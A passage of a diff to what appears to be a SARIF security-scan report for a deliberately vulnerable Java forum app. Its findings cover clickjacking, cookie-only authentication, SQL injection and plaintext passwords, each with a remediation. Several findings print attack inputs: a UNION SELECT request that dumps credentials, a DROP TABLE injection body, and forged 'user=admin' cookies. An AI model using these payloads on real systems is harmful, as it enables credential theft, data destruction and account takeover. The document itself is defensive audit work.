content=\"IE=edge\"&gt;\n7&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n8&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;Insecure Forum&lt;/title&gt;\n9&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;link rel=\"stylesheet\" href=\"/css/fontawesome.min.css\"&gt;</pre><h3>Remediation</h3>1. <strong>Set the <code>X-Frame-Options: DENY</code> (or <code>SAMEORIGIN</code>) HTTP response header</strong> on every response via a servlet filter (preferable) so that browsers refuse to load the page in any frame.\n2. Alternatively, add a <code>Content-Security-Policy: frame-ancestors 'none'</code> (or <code>'self'</code>) header in the same filter.\n3. If a meta-tag approach is used as a secondary measure, add to the <code>&lt;head&gt;</code> in <code>pagetemplate.tag</code>:\n   <pre>&nbsp;&nbsp;&nbsp;&lt;meta http-equiv=\"Content-Security-Policy\" content=\"frame-ancestors 'none'\"&gt;\n&nbsp;&nbsp;&nbsp;</pre>   Note: HTTP headers are preferred because <code>&lt;meta&gt;</code> CSP does not support <code>frame-ancestors</code> in all browsers.\n4. When adopting Spring Security, configure <code>http.headers().frameOptions().deny()</code> to apply the header automatically.",
-            "markdown": "`pagetemplate.tag` renders the outer HTML frame for every page in the application. It does not emit any `X-Frame-Options` HTTP response header, nor does it include a `Content-Security-Policy: frame-ancestors` directive (either as an HTTP header or a `<meta http-equiv>` tag in `<head>`).\n\nNo HTTP response filter in the project sets these headers either (`AuthenticationFilter` only manages authentication state; no other servlet filter is present).\n\nBecause no framing restriction is in place, an attacker can embed any page of the forum inside an `<iframe>` on a malicious site and conduct UI-redressing (clickjacking) attacks — for example, tricking an authenticated user into submitting the compose-post form by overlaying transparent interface elements, or hijacking a login form to steal credentials."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/webapp/WEB-INF/tags/pagetemplate.tag"
-                },
-                "region": {
-                  "startLine": 4,
-                  "snippet": {
-                    "text": "<%@tag description=\"Main page template\" pageEncoding=\"UTF-8\"%>\n<%@taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\"%>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Insecure Forum</title>\n    <link rel=\"stylesheet\" href=\"/css/fontawesome.min.css\">"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "7BBCBFD1312D6EA327E60340F2159773"
-          },
-          "properties": {
-            "impact": 2.5,
-            "likelihood": 2.5,
-            "snippetStartLine": 1,
-            "summary": "pagetemplate.tag produces no X-Frame-Options or CSP frame-ancestors directive, leaving every application page vulnerable to clickjacking via iframe embedding.",
-            "remediationSummary": "Add an X-Frame-Options: DENY (or CSP frame-ancestors 'none') HTTP response header via a servlet filter to prevent all pages from being embedded in attacker-controlled frames.",
-            "remediation": "1. **Set the `X-Frame-Options: DENY` (or `SAMEORIGIN`) HTTP response header** on every response via a servlet filter (preferable) so that browsers refuse to load the page in any frame.\n2. Alternatively, add a `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) header in the same filter.\n3. If a meta-tag approach is used as a secondary measure, add to the `<head>` in `pagetemplate.tag`:\n   ```html\n   <meta http-equiv=\"Content-Security-Policy\" content=\"frame-ancestors 'none'\">\n   ```\n   Note: HTTP headers are preferred because `<meta>` CSP does not support `frame-ancestors` in all browsers.\n4. When adopting Spring Security, configure `http.headers().frameOptions().deny()` to apply the header automatically."
+            "impact": 1.5,
+            "likelihood": 1.5,
+            "snippetStartLine": 28,
+            "summary": "All four GitHub Actions are referenced via mutable version tags instead of pinned commit SHAs, enabling supply-chain substitution attacks.",
+            "remediationSummary": "Replace all @v1/@v2 action tags with the corresponding immutable commit SHA hashes to prevent tag-mutation supply-chain attacks.",
+            "remediation": "Pin every external `uses:` reference to an **immutable commit SHA** rather than a version tag. For example:\n\n```yaml\nuses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2\nuses: github/codeql-action/init@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/autobuild@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/analyze@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\n```\n\nKeep the human-readable version in a comment. Tooling such as Dependabot (`update-config: github-actions`) or `pin-github-action` can automate this and keep the SHAs up to date."
           }
         },
         {
           "ruleId": "authentication-bad-practice",
           "level": "error",
           "message": {
-            "text": "The entire authentication gate in <code>AuthenticationFilter.doFilter</code> reduces to:<pre>boolean loggedIn = cookies != null &amp;&amp; stream(cookies).anyMatch(c -&gt; \"user\".equals(c.getName()));</pre>The only check performed is whether a cookie with the <strong>name</strong> <code>\"user\"</code> exists. The <strong>value</strong> of that cookie is never verified. There is no cryptographic signature, no HMAC, no server-side session record, and no expiry check. Any browser user can open DevTools and manually create a cookie named <code>user</code> with an arbitrary value (e.g. <code>admin</code>) and will immediately be treated as a fully authenticated user.\n\nSeparately, <code>AuthenticationController.setCookie</code> stores the raw username as the cookie value without any signing:<pre>Cookie cookie = new Cookie(\"user\", username);</pre>An attacker who sets <code>user=alice</code> can impersonate any registered account without knowing the password.\n\n<strong>Attack path:</strong> <code>GET /messages/list</code> → add a cookie <code>user=anyvalue</code> in the browser → full authenticated access to all protected endpoints.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/AuthenticationFilter.java</code><pre>39&nbsp;|&nbsp;public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n40&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpServletRequest httpReq = (HttpServletRequest)request;\n41&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpServletResponse httpResp = (HttpServletResponse)response;\n42&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String path = httpReq.getServletPath();\n43&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie[] cookies = httpReq.getCookies();\n44&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;boolean loggedIn = cookies != null &amp;&amp; stream(cookies).anyMatch(c -&gt; \"user\".equals(c.getName()));\n45&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpReq.setAttribute(\"loggedIn\", loggedIn);\n46&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(whitelist.test(path)) {\n47&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logger.debug(\"Path {} matches whitelist, allowing\", path);\n48&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chain.doFilter(request, response);\n49&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</pre><h3>Remediation</h3>Replace the hand-rolled cookie check with a proper server-side session or a cryptographically signed token:\n\n1. <strong>Server-side sessions (recommended):</strong> Use the Servlet <code>HttpSession</code>. On successful login, call <code>request.getSession().setAttribute(\"username\", username)</code>. In the filter, check <code>session.getAttribute(\"username\") != null</code>.\n2. <strong>Signed tokens:</strong> If a stateless cookie is required, sign the cookie value with a strong HMAC (e.g. <code>javax.crypto.Mac</code> / HMAC-SHA256) using a secret key and verify the signature in the filter before trusting any identity claim.\n3. <strong>Spring Security:</strong> Replace the custom filter with Spring Security's session management, which handles all of this correctly out of the box.\n\nRegardless of approach, also set <code>HttpOnly</code> and <code>Secure</code> flags on the resulting cookie to prevent XSS-based theft and transmission over plain HTTP.",
-            "markdown": "The entire authentication gate in `AuthenticationFilter.doFilter` reduces to:\n\n```java\nboolean loggedIn = cookies != null && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n```\n\nThe only check performed is whether a cookie with the **name** `\"user\"` exists. The **value** of that cookie is never verified. There is no cryptographic signature, no HMAC, no server-side session record, and no expiry check. Any browser user can open DevTools and manually create a cookie named `user` with an arbitrary value (e.g. `admin`) and will immediately be treated as a fully authenticated user.\n\nSeparately, `AuthenticationController.setCookie` stores the raw username as the cookie value without any signing:\n```java\nCookie cookie = new Cookie(\"user\", username);\n```\nAn attacker who sets `user=alice` can impersonate any registered account without knowing the password.\n\n**Attack path:** `GET /messages/list` → add a cookie `user=anyvalue` in the browser → full authenticated access to all protected endpoints."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/java/com/example/insecureforum/web/AuthenticationFilter.java"
-                },
-                "region": {
-                  "startLine": 44,
-                  "snippet": {
-                    "text": "    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest httpReq = (HttpServletRequest)request;\n        HttpServletResponse httpResp = (HttpServletResponse)response;\n        String path = httpReq.getServletPath();\n        Cookie[] cookies = httpReq.getCookies();\n        boolean loggedIn = cookies != null && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n        httpReq.setAttribute(\"loggedIn\", loggedIn);\n        if(whitelist.test(path)) {\n            logger.debug(\"Path {} matches whitelist, allowing\", path);\n            chain.doFilter(request, response);\n        } else {"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "C80A51BB30CC5738A8F5D9049DDA35A0"
-          },
-          "properties": {
-            "impact": 4.5,
-            "likelihood": 5,
-            "snippetStartLine": 39,
-            "summary": "Authentication decided solely by the presence of a cookie named \"user\" — any value, no integrity check.",
-            "remediationSummary": "Replace cookie-existence check with a server-side session or HMAC-signed token; never trust an unsigned client-side cookie as proof of identity.",
-            "remediation": "Replace the hand-rolled cookie check with a proper server-side session or a cryptographically signed token:\n\n1. **Server-side sessions (recommended):** Use the Servlet `HttpSession`. On successful login, call `request.getSession().setAttribute(\"username\", username)`. In the filter, check `session.getAttribute(\"username\") != null`.\n2. **Signed tokens:** If a stateless cookie is required, sign the cookie value with a strong HMAC (e.g. `javax.crypto.Mac` / HMAC-SHA256) using a secret key and verify the signature in the filter before trusting any identity claim.\n3. **Spring Security:** Replace the custom filter with Spring Security's session management, which handles all of this correctly out of the box.\n\nRegardless of approach, also set `HttpOnly` and `Secure` flags on the resulting cookie to prevent XSS-based theft and transmission over plain HTTP."
-          }
-        },
-        {
-          "ruleId": "sql-injection",
-          "level": "error",
-          "message": {
-            "text": "The <code>read()</code> handler takes the <code>{id}</code> URL path segment as a raw <code>String</code> and passes it unchanged to <code>messageDao.read(id)</code>. Inside <code>MessageDAO.read()</code>, this value is concatenated directly into a SQL query:<pre>// MessageDAO.java (line 41-42)\njdbcTemplate.query(\"SELECT id, author, subject, body, timestamp \" +\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"FROM messages WHERE id = \" + id, ...)</pre>Because <code>id</code> is typed as <code>String</code> (not an <code>int</code>/<code>long</code>) in the controller, the full, unvalidated URL path segment reaches the SQL string. A request such as:<pre>GET /messages/read/1 OR 1=1--\nGET /messages/read/1 UNION SELECT null,username,password,null,null FROM users--</pre>allows an unauthenticated-or-authenticated attacker to dump arbitrary database tables, including the <code>users</code> table that stores credentials.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/MessageController.java</code><pre>23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return \"messages/list\";\n24&nbsp;|&nbsp;}\n25&nbsp;|&nbsp;\n26&nbsp;|&nbsp;@RequestMapping(value = \"/messages/read/{id}\", method = RequestMethod.GET)\n27&nbsp;|&nbsp;public String read(@PathVariable(\"id\") String id, Model model) {\n28&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model.addAttribute(\"msg\", messageDao.read(id));\n29&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return \"messages/read\";\n30&nbsp;|&nbsp;}\n31&nbsp;|&nbsp;\n32&nbsp;|&nbsp;@RequestMapping(value = \"/messages/compose\", method = RequestMethod.GET)\n33&nbsp;|&nbsp;public String compose() {</pre><h3>Remediation</h3>1. <strong>Change the path-variable type to <code>long</code></strong> in the controller so Spring rejects non-numeric values before the DAO is ever called:\n   <pre>&nbsp;&nbsp;&nbsp;public String read(@PathVariable(\"id\") long id, Model model) {\n&nbsp;&nbsp;&nbsp;</pre>2. <strong>Use a parameterized query in <code>MessageDAO.read()</code>:</strong>\n   <pre>&nbsp;&nbsp;&nbsp;jdbcTemplate.query(\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"SELECT id, author, subject, body, timestamp FROM messages WHERE id = ?\",\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new Object[]{id},\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rs -&gt; { ... });\n&nbsp;&nbsp;&nbsp;</pre>   Never concatenate any user-supplied value into a SQL string.",
-            "markdown": "The `read()` handler takes the `{id}` URL path segment as a raw `String` and passes it unchanged to `messageDao.read(id)`. Inside `MessageDAO.read()`, this value is concatenated directly into a SQL query:\n\n```java\n// MessageDAO.java (line 41-42)\njdbcTemplate.query(\"SELECT id, author, subject, body, timestamp \" +\n        \"FROM messages WHERE id = \" + id, ...)\n```\n\nBecause `id` is typed as `String` (not an `int`/`long`) in the controller, the full, unvalidated URL path segment reaches the SQL string. A request such as:\n\n```\nGET /messages/read/1 OR 1=1--\nGET /messages/read/1 UNION SELECT null,username,password,null,null FROM users--\n```\n\nallows an unauthenticated-or-authenticated attacker to dump arbitrary database tables, including the `users` table that stores credentials."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/java/com/example/insecureforum/web/MessageController.java"
-                },
-                "region": {
-                  "startLine": 28,
-                  "snippet": {
-                    "text": "        return \"messages/list\";\n    }\n\n    @RequestMapping(value = \"/messages/read/{id}\", method = RequestMethod.GET)\n    public String read(@PathVariable(\"id\") String id, Model model) {\n        model.addAttribute(\"msg\", messageDao.read(id));\n        return \"messages/read\";\n    }\n\n    @RequestMapping(value = \"/messages/compose\", method = RequestMethod.GET)\n    public String compose() {"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "40E9F6D3CCC39ADF9F630B873D99C29C"
-          },
-          "properties": {
-            "impact": 5,
-            "likelihood": 4.5,
-            "snippetStartLine": 23,
-            "summary": "User-supplied URL path variable `id` (String) concatenated into SQL WHERE clause via MessageDAO.read().",
-            "remediationSummary": "Change the path variable type to long and use a parameterized (prepared-statement) query in MessageDAO.read() instead of string concatenation.",
-            "remediation": "1. **Change the path-variable type to `long`** in the controller so Spring rejects non-numeric values before the DAO is ever called:\n   ```java\n   public String read(@PathVariable(\"id\") long id, Model model) {\n   ```\n2. **Use a parameterized query in `MessageDAO.read()`:**\n   ```java\n   jdbcTemplate.query(\n       \"SELECT id, author, subject, body, timestamp FROM messages WHERE id = ?\",\n       new Object[]{id},\n       rs -> { ... });\n   ```\n   Never concatenate any user-supplied value into a SQL string."
-          }
-        },
-        {
-          "ruleId": "password-management",
-          "level": "error",
-          "message": {
-            "text": "<code>UserDAO.authenticate()</code> compares passwords in the SQL query by matching the user's supplied cleartext string directly against the <code>password</code> column:<pre>\"… AND password = '\" + password + \"'\"</pre>The database schema (<code>V1__init.sql</code>) confirms the column is a plain <code>VARCHAR(255)</code> storing literal plaintext passwords (<code>'admin'</code>, <code>'eddy'</code>, <code>'john'</code>). Password hashing is entirely absent. Consequences:\n\n1. <strong>Database breach → instant credential disclosure</strong>: Any SQL injection (see separate findings), database backup leak, or insider threat immediately exposes all user passwords in plaintext.\n2. <strong>Credential stuffing</strong>: Because many users reuse passwords, a dump of this database allows attacks against users' accounts on other services.\n3. <strong>No brute-force resistance</strong>: Without a work-factor (e.g., bcrypt cost), offline cracking is near-instantaneous.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/database/UserDAO.java</code><pre>15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n16&nbsp;|&nbsp;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public boolean authenticate(String username, String password) {\n18&nbsp;|&nbsp;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return jdbcTemplate.query(\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\",\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ResultSet::next);\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n23&nbsp;|&nbsp;\n24&nbsp;|&nbsp;}</pre><h3>Remediation</h3>1. Hash passwords at registration/write time using a modern adaptive algorithm such as <strong>bcrypt</strong> (Spring Security <code>BCryptPasswordEncoder</code>) or <strong>Argon2</strong>.\n2. In <code>authenticate()</code>, load the stored hash and compare using <code>passwordEncoder.matches(rawPassword, storedHash)</code> — do NOT compare in SQL.\n3. Migrate existing passwords: force a reset for all existing accounts and re-hash on next successful login.\n\nExample with Spring Security:<pre>private final PasswordEncoder encoder; // BCryptPasswordEncoder injected\n\npublic boolean authenticate(String username, String password) {\n&nbsp;&nbsp;&nbsp;&nbsp;List&lt;String&gt; hashes = jdbcTemplate.query(\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"SELECT password FROM users WHERE username = ?\",\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new Object[]{username},\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(rs, n) -&gt; rs.getString(1));\n&nbsp;&nbsp;&nbsp;&nbsp;return hashes.size() == 1 &amp;&amp; encoder.matches(password, hashes.get(0));\n}</pre>",
-            "markdown": "\n`UserDAO.authenticate()` compares passwords in the SQL query by matching the user's supplied cleartext string directly against the `password` column:\n\n```java\n\"… AND password = '\" + password + \"'\"\n```\n\nThe database schema (`V1__init.sql`) confirms the column is a plain `VARCHAR(255)` storing literal plaintext passwords (`'admin'`, `'eddy'`, `'john'`). Password hashing is entirely absent. Consequences:\n\n1. **Database breach → instant credential disclosure**: Any SQL injection (see separate findings), database backup leak, or insider threat immediately exposes all user passwords in plaintext.\n2. **Credential stuffing**: Because many users reuse passwords, a dump of this database allows attacks against users' accounts on other services.\n3. **No brute-force resistance**: Without a work-factor (e.g., bcrypt cost), offline cracking is near-instantaneous.\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/java/com/example/insecureforum/database/UserDAO.java"
-                },
-                "region": {
-                  "startLine": 20,
-                  "snippet": {
-                    "text": "    }\n\n    public boolean authenticate(String username, String password) {\n\n        return jdbcTemplate.query(\n                \"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\",\n                ResultSet::next);\n    }\n\n}\n"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "465E621DB10185985F532F622351AC5A"
-          },
-          "properties": {
-            "impact": 4,
-            "likelihood": 3.5,
-            "snippetStartLine": 15,
-            "summary": "Passwords stored and compared in plaintext — no hashing applied anywhere in the authentication flow",
-            "remediationSummary": "Store passwords as bcrypt/Argon2 hashes and compare with a constant-time password encoder; never store or compare cleartext passwords.",
-            "remediation": "\n1. Hash passwords at registration/write time using a modern adaptive algorithm such as **bcrypt** (Spring Security `BCryptPasswordEncoder`) or **Argon2**.\n2. In `authenticate()`, load the stored hash and compare using `passwordEncoder.matches(rawPassword, storedHash)` — do NOT compare in SQL.\n3. Migrate existing passwords: force a reset for all existing accounts and re-hash on next successful login.\n\nExample with Spring Security:\n```java\nprivate final PasswordEncoder encoder; // BCryptPasswordEncoder injected\n\npublic boolean authenticate(String username, String password) {\n    List<String> hashes = jdbcTemplate.query(\n        \"SELECT password FROM users WHERE username = ?\",\n        new Object[]{username},\n        (rs, n) -> rs.getString(1));\n    return hashes.size() == 1 && encoder.matches(password, hashes.get(0));\n}\n```\n"
-          }
-        },
-        {
-          "ruleId": "sql-injection",
-          "level": "error",
-          "message": {
-            "text": "The <code>composeSubmit()</code> POST handler reads three user-controlled values:\n- <code>user</code> — the raw value of the <code>\"user\"</code> cookie (any string the client sets, because the authentication check never validates the cookie value)\n- <code>subject</code> — the <code>subject</code> request parameter\n- <code>body</code> — the <code>body</code> request parameter\n\nAll three are forwarded without any sanitisation to <code>messageDao.post()</code>, which concatenates them directly into an INSERT statement:<pre>// MessageDAO.java (lines 58-59)\njdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) \" +\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"VALUES ('\" + author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");</pre>An attacker can break out of the string literals with a single-quote and inject arbitrary SQL. For example, setting <code>body</code> to:<pre>x', NOW()); DROP TABLE messages; --</pre>would result in:<pre>... VALUES ('user', 'subject', 'x', NOW()); DROP TABLE messages; --', NOW())</pre>This enables data destruction, privilege escalation (writing to the <code>users</code> table), or data exfiltration via time-based/error-based side channels.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/MessageController.java</code><pre>37&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@RequestMapping(value = \"/messages/compose\", method = RequestMethod.POST)\n38&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public RedirectView composeSubmit(@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user,\n39&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@RequestParam(\"subject\") String subject,\n40&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@RequestParam(\"body\") String body) {\n41&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;messageDao.post(user, subject, body);\n42&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new RedirectView(\"./list\");\n43&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n44&nbsp;|&nbsp;\n45&nbsp;|&nbsp;}</pre><h3>Remediation</h3>Replace the <code>execute()</code> with a parameterized <code>update()</code> call in <code>MessageDAO.post()</code>:<pre>jdbcTemplate.update(\n&nbsp;&nbsp;&nbsp;&nbsp;\"INSERT INTO messages(author, subject, body, timestamp) VALUES (?, ?, ?, NOW())\",\n&nbsp;&nbsp;&nbsp;&nbsp;author, subject, body);</pre>No changes to string-building should be needed; <code>JdbcTemplate</code> will bind each parameter safely via a <code>PreparedStatement</code>.",
-            "markdown": "The `composeSubmit()` POST handler reads three user-controlled values:\n- `user` — the raw value of the `\"user\"` cookie (any string the client sets, because the authentication check never validates the cookie value)\n- `subject` — the `subject` request parameter\n- `body` — the `body` request parameter\n\nAll three are forwarded without any sanitisation to `messageDao.post()`, which concatenates them directly into an INSERT statement:\n\n```java\n// MessageDAO.java (lines 58-59)\njdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) \" +\n        \"VALUES ('\" + author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");\n```\n\nAn attacker can break out of the string literals with a single-quote and inject arbitrary SQL. For example, setting `body` to:\n```\nx', NOW()); DROP TABLE messages; --\n```\nwould result in:\n```sql\n... VALUES ('user', 'subject', 'x', NOW()); DROP TABLE messages; --', NOW())\n```\nThis enables data destruction, privilege escalation (writing to the `users` table), or data exfiltration via time-based/error-based side channels."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/java/com/example/insecureforum/web/MessageController.java"
-                },
-                "region": {
-                  "startLine": 41,
-                  "snippet": {
-                    "text": "\n    @RequestMapping(value = \"/messages/compose\", method = RequestMethod.POST)\n    public RedirectView composeSubmit(@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user,\n                                      @RequestParam(\"subject\") String subject,\n                                      @RequestParam(\"body\") String body) {\n        messageDao.post(user, subject, body);\n        return new RedirectView(\"./list\");\n    }\n\n}\n"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "114C08372E88E9DD5310FCDDF8E5ABFC"
-          },
-          "properties": {
-            "impact": 5,
-            "likelihood": 4.5,
-            "snippetStartLine": 36,
-            "summary": "Cookie value and request parameters (subject, body) concatenated into a SQL INSERT statement via MessageDAO.post().",
-            "remediationSummary": "Replace jdbcTemplate.execute() with a parameterized jdbcTemplate.update() in MessageDAO.post() to prevent SQL injection via author, subject, and body values.",
-            "remediation": "Replace the `execute()` with a parameterized `update()` call in `MessageDAO.post()`:\n\n```java\njdbcTemplate.update(\n    \"INSERT INTO messages(author, subject, body, timestamp) VALUES (?, ?, ?, NOW())\",\n    author, subject, body);\n```\n\nNo changes to string-building should be needed; `JdbcTemplate` will bind each parameter safely via a `PreparedStatement`."
-          }
-        },
-        {
-          "ruleId": "session-management",
-          "level": "error",
-          "message": {
-            "text": "<code>AuthenticationController.setCookie()</code> creates the application's sole session token by storing the authenticated username verbatim in a cookie:<pre>Cookie cookie = new Cookie(\"user\", username);   // line 56\ncookie.setPath(\"/\");\ncookie.setMaxAge(-1);\nresponse.addCookie(cookie);</pre>There is no session ID, no HMAC signature, and no server-side session store. <code>AuthenticationFilter.doFilter()</code> considers any HTTP request that merely carries a cookie named <code>\"user\"</code> (regardless of value) as authenticated:<pre>boolean loggedIn = cookies != null\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp; stream(cookies).anyMatch(c -&gt; \"user\".equals(c.getName()));</pre>Any attacker can therefore:\n- Send <code>Cookie: user=admin</code> to instantly impersonate the administrator.\n- Send <code>Cookie: user=&lt;any valid username&gt;</code> to impersonate any forum member.\n\nNo valid credentials, no session lookup, and no server-side state are required. This completely undermines the entire authentication mechanism.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/web/AuthenticationController.java</code><pre>51&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eraseCookie(request, response);\n52&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new RedirectView(\"/\", true);\n53&nbsp;|&nbsp;}\n54&nbsp;|&nbsp;\n55&nbsp;|&nbsp;private void setCookie(HttpServletRequest request, HttpServletResponse response, String username) {\n56&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cookie cookie = new Cookie(\"user\", username);\n57&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.setPath(\"/\");\n58&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookie.setMaxAge(-1);\n59&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.addCookie(cookie);\n60&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request.setAttribute(\"loggedIn\", true);\n61&nbsp;|&nbsp;}</pre><h3>Remediation</h3>Replace the ad-hoc cookie scheme with proper session management:\n\n1. On successful login, call <code>request.getSession(true)</code> (invalidating any existing session first with <code>request.getSession(false).invalidate()</code>) to obtain a container-managed, cryptographically random session ID that is stored server-side.\n2. Store the authenticated username in <code>session.setAttribute(\"authenticatedUser\", username)</code>.\n3. In the authentication filter, check <code>session.getAttribute(\"authenticatedUser\") != null</code> rather than cookie existence.\n4. Alternatively, integrate Spring Security, which provides all of this out-of-the-box.",
-            "markdown": "\n`AuthenticationController.setCookie()` creates the application's sole session token by storing the authenticated username verbatim in a cookie:\n\n```java\nCookie cookie = new Cookie(\"user\", username);   // line 56\ncookie.setPath(\"/\");\ncookie.setMaxAge(-1);\nresponse.addCookie(cookie);\n```\n\nThere is no session ID, no HMAC signature, and no server-side session store. `AuthenticationFilter.doFilter()` considers any HTTP request that merely carries a cookie named `\"user\"` (regardless of value) as authenticated:\n\n```java\nboolean loggedIn = cookies != null\n        && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n```\n\nAny attacker can therefore:\n- Send `Cookie: user=admin` to instantly impersonate the administrator.\n- Send `Cookie: user=<any valid username>` to impersonate any forum member.\n\nNo valid credentials, no session lookup, and no server-side state are required. This completely undermines the entire authentication mechanism.\n"
